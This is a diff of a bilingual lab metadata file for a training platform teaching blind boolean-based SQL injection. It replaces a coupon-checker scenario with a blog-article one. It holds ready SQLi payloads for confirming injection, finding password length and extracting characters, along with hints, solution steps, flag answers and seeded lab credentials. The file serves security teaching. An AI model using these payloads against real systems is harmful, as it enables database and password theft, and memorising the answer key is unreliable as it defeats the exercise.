@@ -1,169 +1,139 @@
-// src/modules/practice-labs/sql-injection/labs/lab3/lab3.metadata.ts
 import type { LabMetadata } from '../../../types/lab-metadata.type';
 
 export const lab3Metadata: LabMetadata = {
   slug: 'sqli-blind-boolean',
-  title: 'SQL Injection: Blind Boolean-Based Extraction',
-  ar_title: 'حقن SQL: الاستخراج الأعمى (Boolean-Based)',
+  title: 'SQL Injection: Blind Boolean-Based',
+  ar_title: 'حقن SQL: الأعمى القائم على البوليان',
   description:
-    "ShopX's promo code endpoint returns only 'valid' or 'invalid' — but it is vulnerable to Blind SQL Injection. Extract a hidden admin secret one character at a time.",
+    'No data is returned in the response — only true/false behavior. Infer hidden data character by character using boolean conditions.',
   ar_description:
-    "نقطة التحقق من الكوبون في ShopX ترجع فقط 'صالح' أو 'غير صالح' — لكنها عرضة لـ Blind SQLi. استخرج السر المخفي حرفًا بحرف.",
-  difficulty: 'ADVANCED',
+    'لا تُعاد أي بيانات في الاستجابة — فقط سلوك صح/خطأ. استنتج البيانات المخفية حرفاً بحرف باستخدام الشروط البوليانية.',
+  difficulty: 'INTERMEDIATE',
   category: 'WEB_SECURITY',
-  skills: [
-    'SQL Injection',
-    'Blind SQLi',
-    'Boolean Inference',
-    'Character-by-Character Extraction',
-    'Automated Exploitation',
-  ],
-  xpReward: 350,
-  pointsReward: 175,
-  duration: 60,
+  skills: ['Blind SQL Injection', 'Boolean Inference', 'Binary Search', 'Data Extraction'],
+  xpReward: 200,
+  pointsReward: 100,
+  duration: 45,
   executionMode: 'SHARED_BACKEND',
   isPublished: true,
+  environmentType: 'BLOG_CMS',
+  canonicalConceptId: 'sqli-blind',
 
-  // ─── للمتدرب ────────────────────────────────────────────────────
-  goal: 'Extract the full admin secret using Boolean-based Blind SQLi in the promo code validator.',
-  ar_goal:
-    'استخرج السر الكامل للمدير باستخدام Blind SQL Injection المبني على Boolean في نقطة التحقق من الكوبون.',
+  goal: 'Infer the admin password from the users table one character at a time using boolean-based blind SQLi.',
+  ar_goal: 'استنتج كلمة مرور الأدمن من جدول المستخدمين حرفاً بحرف باستخدام حقن SQL الأعمى القائم على البوليان.',
+
+  missionBrief: {
+    codename: 'BLIND ORACLE',
+    classification: 'SECRET',
+    objective: 'A blog CMS shows article exists (200) vs not found (404). No data leaks in the body. Use this true/false oracle to extract the admin password byte by byte.',
+    ar_objective: 'نظام إدارة المحتوى يظهر المقالة موجودة (200) أو غير موجودة (404). لا تسريب للبيانات في الجسم. استخدم هذا الـ oracle صح/خطأ لاستخراج كلمة مرور الأدمن بايت بايت.',
+    background: 'This technique is used when the application gives no error messages and reflects no data — only behavior changes based on query truthfulness.',
+    successCriteria: [
+      'Confirm boolean injection point (true vs false response)',
+      'Enumerate password length',
+      'Extract each character using ASCII comparison',
+      'Reconstruct the full password and get the flag',
+    ],
+  },
+
+  labInfo: {
+    vulnType: 'Blind Boolean-Based SQL Injection',
+    ar_vulnType: 'حقن SQL الأعمى القائم على البوليان',
+    cweId: 'CWE-89',
+    cvssScore: 8.5,
+    description: 'When no data is reflected, attackers ask yes/no questions to the database. Each boolean condition narrows down the answer until the full value is recovered.',
+    ar_description: 'عندما لا تنعكس أي بيانات، يطرح المهاجمون أسئلة نعم/لا على قاعدة البيانات. كل شرط بوليان يضيّق الإجابة حتى يتم استرداد القيمة الكاملة.',
+    whatYouLearn: [
+      'How to confirm blind injection using true/false responses',
+      'How to enumerate string length with LEN/LENGTH functions',
+      'How to extract characters using ASCII() and SUBSTRING()',
+      'How automated tools like sqlmap implement this attack',
+    ],
+    techStack: ['Node.js', 'PostgreSQL', 'Raw SQL'],
+  },
 
   briefing: {
-    en: `ShopX — an e-commerce platform with 2 million active users — has a promo code system at checkout.
-Enter a valid code: "Coupon applied!". Enter an invalid one: "Invalid coupon."
-That's all you get. No data. No errors. Just two possible answers.
-Somewhere in that database, there's a secret note that only the admin can see.
-You can't read the database directly. But you can ask it yes/no questions... 
-and with enough patience, yes/no is all you need.`,
-    ar: `ShopX — منصة تجارة إلكترونية بـ 2 مليون مستخدم نشط — لديها نظام كوبونات عند الدفع.
-أدخل كوداً صحيحاً: "تم تطبيق الكوبون!". أدخل كوداً خاطئاً: "كوبون غير صالح."
-هذا كل ما ستحصل عليه. لا بيانات. لا أخطاء. فقط إجابتان محتملتان.
-في مكان ما في قاعدة البيانات هذه، توجد ملاحظة سرية لا يستطيع رؤيتها إلا المدير.
-لا تستطيع قراءة قاعدة البيانات مباشرة. لكن يمكنك طرح أسئلة بنعم/لا...
-وبما يكفي من الصبر، نعم/لا هو كل ما تحتاجه.`,
+    en: `A blog CMS exposes an article lookup endpoint: GET /article?id=5\nArticle exists → 200 OK with content. Not found → 404.\nNo SQL errors. No data in response body.\nBut the id parameter goes directly into the query.\nCan you extract data when you can't see it?`,
+    ar: `نظام إدارة المحتوى يعرض نقطة نهاية للبحث عن المقالات: GET /article?id=5\nالمقالة موجودة → 200 مع محتوى. غير موجودة → 404.\nلا أخطاء SQL. لا بيانات في جسم الاستجابة.\nلكن معامل id يذهب مباشرة للاستعلام.\nهل يمكنك استخراج البيانات دون رؤيتها؟`,
   },
 
   stepsOverview: {
     en: [
-      'Confirm the injection point — prove the coupon field is vulnerable despite showing no data',
-      'Verify that a secret entry exists in the database by asking the database a true/false question',
-      'Extract the secret one character at a time using SUBSTRING and boolean conditions',
-      'Iterate through every character position until the full secret is assembled',
-      'Automate the extraction process — manual character-by-character is too slow at scale',
+      'Confirm — id=5 AND 1=1 returns 200, id=5 AND 1=2 returns 404',
+      'Length — id=5 AND LENGTH((SELECT password FROM users WHERE username=\'admin\'))=N',
+      'Extract — id=5 AND ASCII(SUBSTRING((SELECT password FROM users...),POS,1))>N',
     ],
     ar: [
-      'أكّد نقطة الحقن — أثبت أن حقل الكوبون ضعيف رغم عدم ظهور أي بيانات',
-      'تحقق من وجود إدخال سري في قاعدة البيانات بطرح سؤال صح/خطأ على قاعدة البيانات',
-      'استخرج السر حرفاً بحرف باستخدام SUBSTRING وشروط boolean',
-      'كرر على كل موضع حرف حتى يكتمل تجميع السر الكامل',
-      'أتمت عملية الاستخراج — الاستخراج اليدوي حرفاً بحرف بطيء جداً عند التوسع',
+      'تأكيد — id=5 AND 1=1 يعيد 200، id=5 AND 1=2 يعيد 404',
+      'الطول — id=5 AND LENGTH((SELECT password FROM users WHERE username=\'admin\'))=N',
+      'استخراج — id=5 AND ASCII(SUBSTRING((SELECT password...),POS,1))>N',
     ],
   },
 
-  // ─── للأدمن فقط ─────────────────────────────────────────────────
   solution: {
-    context:
-      "ShopX's checkout page validates promo codes. The response is always binary — no data, no errors. An admin note containing the flag was stored as a private content entry with title='admin_secret'. Extract it character by character using boolean conditions.",
-    vulnerableCode:
-      'SELECT id FROM "LabGenericContent"\n' +
-      "WHERE userId='...' AND labId='..'\n" +
-      "AND title='valid_coupon' AND body='COUPON_INPUT'",
-    exploitation:
-      "1) Confirm: ' OR '1'='1'-- → 'Coupon applied!'\n" +
-      "2) Verify secret exists: ' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --\n" +
-      "3) Extract char 1: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1)='F'--\n" +
-      '4) Loop position 1→30, charset: FLAG{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n' +
-      '5) Assemble all chars → submit as flag.',
+    context: 'Article lookup: SELECT * FROM articles WHERE id = $input',
+    vulnerableCode: 'SELECT * FROM articles WHERE id = ' + "'$id'",
+    exploitation: "5 AND 1=1-- (true→200), 5 AND 1=2-- (false→404). Then: 5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8-- to find length. Then binary search each char with ASCII(SUBSTRING(...)).",
     steps: {
       en: [
-        "POST /lab3/check-coupon with { coupon: \"' OR '1'='1'--\" } → response: 'Coupon applied!' → injection confirmed",
-        "Verify secret: { coupon: \"' OR (SELECT COUNT(*) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret') > 0 --\" } → 'Coupon applied!'",
-        "Extract char 1: { coupon: \"' OR (SELECT SUBSTRING(body,1,1) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret' LIMIT 1)='F'--\" } → 'Coupon applied!' → char 1 = 'F'",
-        "Extract char 2: change SUBSTRING(body,2,1) and test 'L' → 'Coupon applied!' → char 2 = 'L'",
-        "Write a script: loop pos 1→30, for each pos try all chars in charset until 'Coupon applied!' → assemble FLAG{...} → submit",
+        'id=5 AND 1=1-- → 200 (confirms injection)',
+        'id=5 AND 1=2-- → 404 (confirms false condition)',
+        "id=5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8-- → 200",
+        "id=5 AND ASCII(SUBSTRING((SELECT password FROM lab_users WHERE username='admin'),1,1))=115-- → 200 (s)",
+        'Repeat for each position until full password is revealed',
       ],
       ar: [
-        "أرسل POST /lab3/check-coupon مع { coupon: \"' OR '1'='1'--\" } → استجابة: 'تم تطبيق الكوبون!' → الحقن مؤكد",
-        "تحقق من السر: { coupon: \"' OR (SELECT COUNT(*) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret') > 0 --\" } → 'تم تطبيق الكوبون!'",
-        "استخرج الحرف 1: { coupon: \"' OR (SELECT SUBSTRING(body,1,1) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret' LIMIT 1)='F'--\" } → 'تم تطبيق الكوبون!' → الحرف 1 = 'F'",
-        "استخرج الحرف 2: غيّر SUBSTRING(body,2,1) واختبر 'L' → 'تم تطبيق الكوبون!' → الحرف 2 = 'L'",
-        "اكتب سكريبت: كرر pos من 1→30، لكل موضع جرب كل أحرف charset حتى 'تم تطبيق الكوبون!' → جمّع FLAG{...} → أرسل",
+        'id=5 AND 1=1-- → 200 (يؤكد الحقن)',
+        'id=5 AND 1=2-- → 404 (يؤكد الشرط الخاطئ)',
+        "id=5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8-- → 200",
+        "id=5 AND ASCII(SUBSTRING((SELECT password FROM lab_users WHERE username='admin'),1,1))=115-- → 200 (s)",
+        'كرر لكل موضع حتى تُكشف كلمة المرور كاملة',
       ],
     },
     fix: [
-      'Use parameterized queries — never concatenate coupon input into SQL',
-      'Return generic error messages — never leak boolean differences that hint at injection',
-      'Rate limit the coupon endpoint — automated character extraction requires hundreds of requests',
-      'Monitor for repeated requests with SQL patterns (SUBSTRING, COUNT, SELECT) in inputs',
+      'Use parameterized queries: WHERE id = $1',
+      'Cast id to integer — reject non-numeric input',
+      'Never pass user input directly into SQL',
     ],
   },
 
   postSolve: {
     explanation: {
-      en: 'Blind Boolean-Based SQLi exploits endpoints that return different responses based on true/false conditions, without showing actual data. By asking the database binary questions (is character X at position Y equal to Z?), an attacker can reconstruct any value character by character.',
-      ar: 'يستغل حقن SQL الأعمى المبني على Boolean نقاط النهاية التي تُرجع استجابات مختلفة بناءً على شروط صح/خطأ، دون إظهار بيانات فعلية. بطرح أسئلة ثنائية على قاعدة البيانات (هل الحرف X في الموضع Y يساوي Z؟)، يمكن للمهاجم إعادة بناء أي قيمة حرفاً بحرف.',
+      en: 'Blind boolean SQLi exploits the application\'s binary behavior (found/not found) as a communication channel. Each boolean query retrieves one bit of information.',
+      ar: 'يستغل حقن SQL الأعمى البوليان السلوك الثنائي للتطبيق (موجود/غير موجود) كقناة اتصال. كل استعلام بوليان يسترد بت واحد من المعلومات.',
     },
     impact: {
-      en: 'Any data in the database can be extracted including passwords, tokens, and secrets — even from endpoints that appear to show nothing. Automation makes this practical even for large secrets.',
-      ar: 'يمكن استخراج أي بيانات في قاعدة البيانات بما في ذلك كلمات المرور والـ tokens والأسرار — حتى من نقاط النهاية التي تبدو أنها لا تُظهر شيئاً. الأتمتة تجعل هذا عملياً حتى للأسرار الكبيرة.',
+      en: 'Full database read despite no data reflection. Slower than UNION but works against any SQL endpoint with boolean-observable behavior.',
+      ar: 'قراءة كاملة لقاعدة البيانات رغم عدم انعكاس البيانات. أبطأ من UNION لكن يعمل مع أي نقطة SQL مع سلوك بوليان قابل للملاحظة.',
     },
-    fix: [
-      'Parameterized queries eliminate the injection point entirely',
-      'Consistent response times and messages prevent timing/boolean inference',
-      'Aggressive rate limiting on all public endpoints',
-      'Web Application Firewall with SQLi signature detection',
-    ],
+    fix: ['Parameterized queries', 'Input type validation (cast to int)', 'WAF with blind sqli signatures'],
   },
 
   hints: [
     {
       order: 1,
-      xpCost: 10,
-      content:
-        "Confirm injection: try coupon value `' OR '1'='1'--` — if it returns 'Coupon applied!', the field is injectable despite showing no data.",
+      xpCost: 15,
+      content: "First confirm blind injection. Try:\n  /article?id=5 AND 1=1--  → should return 200 (article found)\n  /article?id=5 AND 1=2--  → should return 404 (article not found)\nDifferent responses = blind injection confirmed.",
     },
     {
       order: 2,
-      xpCost: 20,
-      content:
-        "A secret note exists with title='admin_secret'. Confirm its existence: `' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --`",
+      xpCost: 25,
+      content: "Now find the password length:\n  /article?id=5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8--\nKeep trying different numbers (5,6,7,8...) until you get 200.",
     },
     {
       order: 3,
       xpCost: 40,
-      content:
-        "Extract one character at a time: `' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1) = 'F'--` — change position and character until you find each one.",
+      content: "Extract each character using ASCII:\n  /article?id=5 AND ASCII(SUBSTRING((SELECT password FROM lab_users WHERE username='admin'),1,1))=115--\n→ ASCII 115 = 's'. Repeat for positions 2,3,4... to reconstruct the full password.",
     },
   ],
 
-  flagAnswer: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
+  flagAnswer: 'FLAG{SQLI_BLIND_BOOLEAN_SUCCESS}',
   initialState: {
-    contents: [
-      {
-        title: 'valid_coupon',
-        body: 'SAVE20SUMMER',
-        isPublic: true,
-        author: 'marketing',
-      },
-      {
-        title: 'valid_coupon',
-        body: 'FLASH50OFF',
-        isPublic: true,
-        author: 'marketing',
-      },
-      {
-        title: 'valid_coupon',
-        body: 'WELCOME10',
-        isPublic: true,
-        author: 'marketing',
-      },
-      {
-        title: 'admin_secret',
-        body: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
-        isPublic: false,
-        author: 'admin',
-      },
+    articles: [
+      { id: 5, title: 'Getting Started with Node.js', content: 'Node.js is a JavaScript runtime...' },
+    ],
+    lab_users: [
+      { username: 'admin', password: 'secr3t!X' },
     ],
   },
 };
